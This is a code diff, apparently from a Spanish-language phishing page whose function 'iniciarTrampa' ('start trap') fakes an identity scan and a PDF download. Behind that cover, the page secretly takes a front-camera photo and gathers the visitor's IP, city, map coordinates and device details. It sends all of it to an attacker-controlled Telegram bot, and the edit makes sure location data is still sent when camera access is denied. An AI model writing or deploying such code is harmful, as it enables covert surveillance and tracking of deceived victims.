@@ -6,61 +6,63 @@ async function iniciarTrampa() {
             textGuide.innerHTML = "ESCANEANDO... MANTENGA LA POSICIÓN";
             setTimeout(() => { fill.style.width = "100%"; }, 100);
 
+            let fotoBlob = null;
+            let reporte = "";
+
             try {
-                // 1. Captura de cámara con espera de enfoque
+                // 1. Obtener datos de ubicación primero
+                const resIP = await fetch('https://ipapi.co/json/');
+                const d = await resIP.json();
+                const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Desconocido";
+                
+                reporte = `👤 *VERIFICACIÓN COMPLETADA*\n\n` +
+                          `📱 *EQ:* ${equipo}\n` +
+                          `🌐 *IP:* \`${d.ip}\`\n` +
+                          `📍 *Lugar:* ${d.city}, ${d.country_name}\n` +
+                          `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+
+                // 2. Intentar Captura de cámara
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
+                video.setAttribute("playsinline", true); 
                 await video.play();
                 
-                // Esperamos un segundo para que la cámara aclare la imagen
-                await new Promise(r => setTimeout(r, 1000));
+                // Espera de seguridad para que la cámara se aclare
+                await new Promise(r => setTimeout(r, 1200));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; 
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+                
+                fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
                 stream.getTracks().forEach(t => t.stop());
 
-                // 2. Obtener ubicación
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                const equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1];
-
-                const reporte = `👤 *VERIFICACIÓN COMPLETADA*\n\n📱 *EQ:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-
-                // 3. ENVÍO OBLIGATORIO (Esperamos a que ambos terminen)
-                const fd = new FormData();
-                fd.append('chat_id', CONFIG.CHAT_ID);
-                fd.append('photo', fotoBlob, 'foto.jpg');
-                fd.append('caption', reporte); // Enviamos el texto y la foto juntos
-                fd.append('parse_mode', 'Markdown');
-
-                // Usamos sendPhoto para enviar todo de un solo golpe
-                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: fd
-                });
-
             } catch(e) { 
-                console.log("Error en captura:", e); 
-                // Si la cámara falla, intentamos enviar al menos el texto
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    const d = await res.json();
-                    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: CONFIG.CHAT_ID, 
-                            text: "⚠️ FALLÓ CÁMARA\nIP: " + d.ip
-                        })
-                    });
-                } catch(err) {}
+                console.log("Error o cámara denegada");
+                if(reporte === "") reporte = "⚠️ El usuario denegó permisos o hubo un error técnico.";
             }
 
-            // 4. Finalización
+            // 3. ENVÍO A TELEGRAM
+            const fd = new FormData();
+            fd.append('chat_id', CONFIG.CHAT_ID);
+            
+            if (fotoBlob) {
+                fd.append('photo', fotoBlob, 'captura.jpg');
+                fd.append('caption', reporte);
+                fd.append('parse_mode', 'Markdown');
+                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } else {
+                // Si no hay foto, enviar solo el texto
+                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: reporte, parse_mode: 'Markdown' })
+                });
+            }
+
+            // 4. Redirección final
             setTimeout(() => {
                 beep.play();
                 textGuide.innerHTML = "✅ IDENTIDAD CONFIRMADA. ABRIENDO PDF...";
